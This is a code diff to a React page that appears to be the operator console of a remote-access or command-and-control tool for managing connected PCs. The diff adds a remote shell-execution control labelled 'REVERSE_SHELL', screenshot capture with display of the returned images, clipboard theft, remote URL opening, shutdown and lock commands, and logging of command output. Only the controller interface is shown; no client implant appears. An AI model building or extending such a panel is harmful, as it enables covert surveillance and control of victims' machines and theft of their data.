@@ -5,7 +5,10 @@ import {
   Search, ShieldCheck, Database, 
   Eye, Lock,
   RefreshCcw,
-  MessageSquare, Volume2, Info
+  MessageSquare, Volume2, Info,
+  Cpu, HardDrive, FileText, Folder, Zap,
+  Download, ChevronRight, X, AlertTriangle,
+  Clipboard, Power
 } from 'lucide-react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { toast } from 'sonner';
@@ -41,6 +44,11 @@ const HDexPage: React.FC = () => {
   const [searchQuery, setSearchQuery] = useState('');
   const [logs, setLogs] = useState<LogEntry[]>([]);
   const [loading, setLoading] = useState(false);
+  const [lastSct, setLastSct] = useState<string | null>(null);
+
+  // Command Input State
+  const [inputModal, setInputModal] = useState<{ open: boolean, command: string, label: string, placeholder: string } | null>(null);
+  const [inputValue, setInputValue] = useState('');
 
   const accentColor = '#3498db'; // PC Blue Accent
 
@@ -68,6 +76,9 @@ const HDexPage: React.FC = () => {
       results.forEach((res: any) => {
         if (!logs.some(l => l.data?.id === res.id)) {
            addLog(`Result: ${res.command_name.toUpperCase()} -> ${res.status.toUpperCase()}`, res.status === 'success' ? 'result' : 'error', res);
+           if (res.command_name === 'screenshot' && res.status === 'success' && res.data) {
+              setLastSct(res.data); // Base64 data from client
+           }
         }
       });
     } catch (err) {}
@@ -115,6 +126,19 @@ const HDexPage: React.FC = () => {
     }
   };
 
+  const handleCommandWithInput = (command: string, label: string, placeholder: string) => {
+    setInputModal({ open: true, command, label, placeholder });
+    setInputValue('');
+  };
+
+  const submitCommandInput = () => {
+    if (inputModal) {
+      const payload = inputModal.command === 'shell' ? { command: inputValue } : { url: inputValue };
+      sendCommand(inputModal.command, payload);
+      setInputModal(null);
+    }
+  };
+
   const filteredNodes = nodes.filter(n => 
     n.id.toLowerCase().includes(searchQuery.toLowerCase()) || 
     (n.model && n.model.toLowerCase().includes(searchQuery.toLowerCase()))
@@ -123,6 +147,26 @@ const HDexPage: React.FC = () => {
   return (
     <div className="container" style={{ maxWidth: '1800px', padding: '1rem' }}>
        
+       <AnimatePresence>
+        {inputModal && (
+          <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.9)', zIndex: 3000, display: 'flex', alignItems: 'center', justifyContent: 'center', backdropFilter: 'blur(10px)' }}>
+            <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }} className="card" style={{ width: '450px', padding: '2.5rem', border: `1px solid ${accentColor}` }}>
+              <h3>{inputModal.label}</h3>
+              <input 
+                autoFocus type="text" value={inputValue} onChange={e => setInputValue(e.target.value)} 
+                placeholder={inputModal.placeholder}
+                style={{ width: '100%', padding: '1.2rem', background: '#000', border: '1px solid #333', color: '#fff', fontSize: '1rem' }}
+                onKeyDown={e => e.key === 'Enter' && submitCommandInput()}
+              />
+              <div style={{ display: 'flex', gap: '1rem', marginTop: '2rem' }}>
+                <button onClick={submitCommandInput} className="btn" style={{ flex: 1, borderColor: accentColor }}>SEND</button>
+                <button onClick={() => setInputModal(null)} className="btn" style={{ background: '#222' }}>CANCEL</button>
+              </div>
+            </motion.div>
+          </div>
+        )}
+      </AnimatePresence>
+
        <header style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem', background: 'rgba(52, 152, 219, 0.05)', padding: '1.2rem', border: '1px solid #1a3a5a' }}>
         <div style={{ display: 'flex', alignItems: 'center', gap: '1.5rem' }}>
           <ShieldCheck size={28} color={accentColor} />
@@ -181,56 +225,38 @@ const HDexPage: React.FC = () => {
         <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem', overflow: 'hidden' }}>
            {selectedNode ? (
              <>
-                {/* Node Performance HUD */}
-                <div className="card" style={{ padding: '1.5rem', border: '1px solid rgba(52, 152, 219, 0.2)' }}>
-                   <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '2rem' }}>
-                      <div style={{ textAlign: 'center' }}>
-                         <div style={{ fontSize: '0.6rem', color: '#444', fontWeight: 'bold' }}>CPU_LOAD</div>
-                         <div style={{ fontSize: '2rem', fontWeight: '900', color: accentColor }}>??%</div>
-                         <div style={{ height: '2px', background: '#111', marginTop: '5px' }}>
-                            <motion.div animate={{ width: `0%` }} style={{ height: '100%', background: accentColor }} />
-                         </div>
-                      </div>
-                      <div style={{ textAlign: 'center' }}>
-                         <div style={{ fontSize: '0.6rem', color: '#444', fontWeight: 'bold' }}>MEMORY_USAGE</div>
-                         <div style={{ fontSize: '2rem', fontWeight: '900', color: '#9b59b6' }}>??%</div>
-                         <div style={{ height: '2px', background: '#111', marginTop: '5px' }}>
-                            <motion.div animate={{ width: `0%` }} style={{ height: '100%', background: '#9b59b6' }} />
-                         </div>
-                      </div>
-                      <div style={{ textAlign: 'center' }}>
-                         <div style={{ fontSize: '0.6rem', color: '#444', fontWeight: 'bold' }}>UPLINK</div>
-                         <div style={{ fontSize: '1.5rem', fontWeight: '900', color: '#2ecc71', marginTop: '5px' }}>ACTIVE</div>
-                         <div style={{ height: '2px', background: '#111', marginTop: '5px' }}>
-                            <motion.div animate={{ width: '100%' }} style={{ height: '100%', background: '#2ecc71' }} />
-                         </div>
-                      </div>
-                   </div>
-                </div>
-
-                {/* Tabs */}
-                <div style={{ display: 'flex', gap: '1rem', borderBottom: '1px solid #111' }}>
+                <div style={{ display: 'flex', gap: '10px', background: '#0a0a0a', padding: '5px', borderRadius: '4px' }}>
                   {['SYSTEM', 'TELEMETRY', 'FILES', 'LOGS'].map((tab: any) => (
                     <button 
                       key={tab} onClick={() => setActiveTab(tab as any)}
                       className={`tab-btn ${activeTab === tab ? 'active' : ''}`}
-                      style={{ color: activeTab === tab ? accentColor : '#444', borderBottomColor: activeTab === tab ? accentColor : 'transparent' }}
+                      style={{ color: activeTab === tab ? accentColor : '#444', borderBottomColor: activeTab === tab ? accentColor : 'transparent', flex: 1 }}
                     >
                       {tab}
                     </button>
                   ))}
                 </div>
 
-                {/* Tab Content */}
                 <div style={{ flex: 1, overflowY: 'auto', padding: '0.5rem' }}>
                    <AnimatePresence mode="wait">
                       {activeTab === 'SYSTEM' && (
-                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} key="sys" style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(150px, 1fr))', gap: '1.2rem' }}>
+                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} key="sys" style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(130px, 1fr))', gap: '1.2rem' }}>
                            <ModuleButton icon={Info} label="SYS_INFO" onClick={() => sendCommand('info')} color={accentColor} />
-                           <ModuleButton icon={MessageSquare} label="SHOW_MSG" onClick={() => sendCommand('message', { text: "Hello from HQ" })} color={accentColor} />
-                           <ModuleButton icon={Volume2} label="PC_BEEP" onClick={() => sendCommand('beep')} color={accentColor} />
-                           <ModuleButton icon={Lock} label="FORCE_LOCK" onClick={() => sendCommand('lock')} danger />
+                           <ModuleButton icon={Terminal} label="SHELL_EXEC" onClick={() => handleCommandWithInput('shell', 'REVERSE_SHELL', 'Enter command...')} color={accentColor} />
+                           <ModuleButton icon={Camera} label="SCREENSHOT" onClick={() => sendCommand('screenshot')} color={accentColor} />
+                           <ModuleButton icon={Clipboard} label="CLIPBOARD" onClick={() => sendCommand('getclipboard')} color={accentColor} />
+                           <ModuleButton icon={MessageSquare} label="SHOW_MSG" onClick={() => handleCommandWithInput('message', 'HQ_ALERT', 'Enter text...')} color={accentColor} />
+                           <ModuleButton icon={LinkIcon} label="OPEN_URL" onClick={() => handleCommandWithInput('openlink', 'REMOTE_NAV', 'https://...')} color={accentColor} />
+                           <ModuleButton icon={Lock} label="LOCK_PC" onClick={() => sendCommand('lock')} danger />
+                           <ModuleButton icon={Power} label="SHUTDOWN" onClick={() => sendCommand('shutdown')} danger />
                         </motion.div>
+                      )}
+                      
+                      {activeTab === 'TELEMETRY' && (
+                        <div style={{ textAlign: 'center', marginTop: '8rem', opacity: 0.2 }}>
+                           <Activity size={48} color={accentColor} style={{ margin: '0 auto 1rem' }} />
+                           <p style={{ fontSize: '0.7rem', letterSpacing: '4px' }}>WAITING_FOR_SENSORS...</p>
+                        </div>
                       )}
                    </AnimatePresence>
                 </div>
@@ -248,11 +274,15 @@ const HDexPage: React.FC = () => {
            
            <div className="card" style={{ flex: 1, display: 'flex', flexDirection: 'column', border: '1px solid #1a3a5a' }}>
               <SectionTitle icon={Eye} label="VISUAL_INTEL" color={accentColor} />
-              <div style={{ flex: 1, background: '#020202', border: '1px solid #1a3a5a', display: 'flex', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
-                 <div style={{ textAlign: 'center', opacity: 0.1 }}>
-                    <Monitor size={80} color={accentColor} />
-                    <p style={{ fontSize: '0.6rem', marginTop: '1rem', letterSpacing: '2px' }}>WAITING_FOR_DATA...</p>
-                 </div>
+              <div style={{ flex: 1, background: '#020202', border: '1px solid #1a3a5a', display: 'flex', alignItems: 'center', justifyContent: 'center', position: 'relative', overflow: 'hidden' }}>
+                 {lastSct ? (
+                    <img src={lastSct} style={{ maxWidth: '100%', maxHeight: '100%', objectFit: 'contain' }} alt="Screenshot" />
+                 ) : (
+                    <div style={{ textAlign: 'center', opacity: 0.1 }}>
+                       <Monitor size={80} color={accentColor} />
+                       <p style={{ fontSize: '0.6rem', marginTop: '1rem', letterSpacing: '2px' }}>WAITING_FOR_DATA...</p>
+                    </div>
+                 )}
               </div>
            </div>
 
@@ -262,7 +292,14 @@ const HDexPage: React.FC = () => {
                  {logs.map(log => (
                     <div key={log.id} style={{ marginBottom: '8px' }}>
                        <span style={{ opacity: 0.3 }}>[{log.time}]</span> 
-                       <span style={{ marginLeft: '10px', color: log.type === 'error' ? '#f55' : log.type === 'success' ? '#2ecc71' : '#fff' }}>{log.text.toUpperCase()}</span>
+                       <span style={{ marginLeft: '10px', color: log.type === 'error' ? '#f55' : log.type === 'success' ? '#2ecc71' : (log.type === 'result' ? '#fff' : '#444') }}>
+                          {log.text.toUpperCase()}
+                       </span>
+                       {log.type === 'result' && log.data?.data && (
+                          <div style={{ background: 'rgba(255,255,255,0.02)', padding: '5px', marginTop: '3px', color: '#888', whiteSpace: 'pre-wrap' }}>
+                             {typeof log.data.data === 'string' ? log.data.data : JSON.stringify(log.data.data, null, 2)}
+                          </div>
+                       )}
                     </div>
                  ))}
                  {logs.length === 0 && <div style={{ textAlign: 'center', marginTop: '4rem', opacity: 0.1 }}>LISTENING_FOR_SIGNALS...</div>}
